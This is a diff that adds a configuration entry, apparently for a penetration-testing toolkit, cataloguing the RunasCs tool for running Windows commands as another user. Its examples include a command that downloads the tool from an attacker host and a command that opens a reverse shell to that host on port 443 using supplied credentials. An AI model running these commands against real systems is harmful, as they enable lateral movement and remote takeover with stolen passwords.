@@ -1,0 +1,22 @@
+schema = 1
+kind = "upload"
+description = "Run a command as another Windows user, from a shell with no desktop"
+tags = ["windows", "lateral", "credentials", "runas"]
+upstream = "https://github.com/antonioCoco/RunasCs"
+licence = "GPL-3.0"
+arch = "x86_64"
+examples = [
+  "iwr http://{lhost}/RunasCs.exe -OutFile RunasCs.exe",
+  "RunasCs.exe <user> <password> \"cmd /c whoami /all\"",
+  "RunasCs.exe <user> <password> cmd.exe -r {lhost}:443",
+]
+
+[[upload]]
+path = "files/RunasCs.exe"
+as = "RunasCs.exe"
+note = "Windows with .NET 4"
+
+[[upload]]
+path = "files/RunasCs_net2.exe"
+as = "RunasCs_net2.exe"
+note = "Windows with .NET 2"
